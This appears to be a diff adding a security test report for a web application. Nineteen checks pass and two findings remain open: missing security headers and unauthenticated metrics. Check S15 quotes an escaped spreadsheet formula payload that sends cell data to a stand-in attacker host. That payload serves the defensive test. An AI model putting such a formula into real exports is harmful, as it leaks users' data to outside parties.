@@ -1,0 +1,128 @@
+[
+  {
+    "id": "S1",
+    "check": "every route needs a valid session",
+    "result": "pass",
+    "detail": "46 routes, 4 cookie forms"
+  },
+  {
+    "id": "S2",
+    "check": "webhook signatures are checked",
+    "result": "pass",
+    "detail": "map[another body's:401 empty:401 none:401 not hex:401 wrong:401]"
+  },
+  {
+    "id": "S3",
+    "check": "a replayed webhook changes nothing",
+    "result": "pass",
+    "detail": "first 204, again 204, rows 1"
+  },
+  {
+    "id": "S4",
+    "check": "webhook content is validated",
+    "result": "pass",
+    "detail": "unknown key 404, unknown event 400, 70 KB body 400"
+  },
+  {
+    "id": "S5",
+    "check": "an unsubscribe link cannot be changed",
+    "result": "pass",
+    "detail": "5 changed links: [404 404 404 404 404], the real link 200"
+  },
+  {
+    "id": "S6",
+    "check": "only real images upload",
+    "result": "pass",
+    "detail": "map[7 MB:400 empty:400 gif:400 html named png:400 svg with script:400 text:400]"
+  },
+  {
+    "id": "S7",
+    "check": "decompression bombs are refused by their header",
+    "result": "pass",
+    "detail": "30000x30000 and 6000x6000 refused for their size: [400 400]"
+  },
+  {
+    "id": "S8",
+    "check": "file names cannot climb directories",
+    "result": "pass",
+    "detail": "201, stored name \"passwd.png\""
+  },
+  {
+    "id": "S9",
+    "check": "uploaded images lose their metadata",
+    "result": "pass",
+    "detail": "marker kept: map[jpeg:false png:false]"
+  },
+  {
+    "id": "S10",
+    "check": "asset paths cannot climb directories",
+    "result": "pass",
+    "detail": "[404 404 404]"
+  },
+  {
+    "id": "S11",
+    "check": "SQL in query strings and paths is data",
+    "result": "pass",
+    "detail": "200 requests, users 116000"
+  },
+  {
+    "id": "S12",
+    "check": "SQL in written fields is data",
+    "result": "pass",
+    "detail": "name 200, audience 201, tables intact t"
+  },
+  {
+    "id": "S13",
+    "check": "email markup and links are escaped",
+    "result": "pass",
+    "detail": "200, 2879 bytes of HTML"
+  },
+  {
+    "id": "S14",
+    "check": "a javascript: call-to-action link is refused",
+    "result": "pass",
+    "detail": "https link 200, javascript: link 422 {\"error\":\"Fix the highlighted messages before saving.\",\"issues\":[{\"field\":\"email_cta_url\",\"reason\":\"invalid_link\",\"messa"
+  },
+  {
+    "id": "S15",
+    "check": "CSV exports do not run formulas",
+    "result": "pass",
+    "detail": "escaped: 115708,\"'=HYPERLINK(\"\"http://evil.example/?x=\"\"\u0026A1,\"\"click\"\")\",email,,ACCEPTED,,1,202,2026-11-08T16:"
+  },
+  {
+    "id": "S16",
+    "check": "oversized and broken bodies are refused",
+    "result": "pass",
+    "detail": "2 MB 400, nested 400, broken 400, huge limit 200, huge days 400"
+  },
+  {
+    "id": "S17",
+    "check": "nginx serves no files outside the app",
+    "result": "pass",
+    "detail": "6 paths, nothing served"
+  },
+  {
+    "id": "S18",
+    "check": "logs hold no personal data or secrets",
+    "result": "pass",
+    "detail": "23423 lines, emails 0, phones 0, secrets 0"
+  },
+  {
+    "id": "S19",
+    "check": "error answers reveal no internals",
+    "result": "pass",
+    "detail": "wrong type 400, unknown id 404"
+  },
+  {
+    "id": "O1",
+    "check": "security headers",
+    "result": "open",
+    "detail": "frontend is missing [Content-Security-Policy X-Frame-Options X-Content-Type-Options Referrer-Policy]"
+  },
+  {
+    "id": "O2",
+    "check": "metrics without a session",
+    "result": "open",
+    "detail": "API /metrics without a session: 200"
+  }
+]
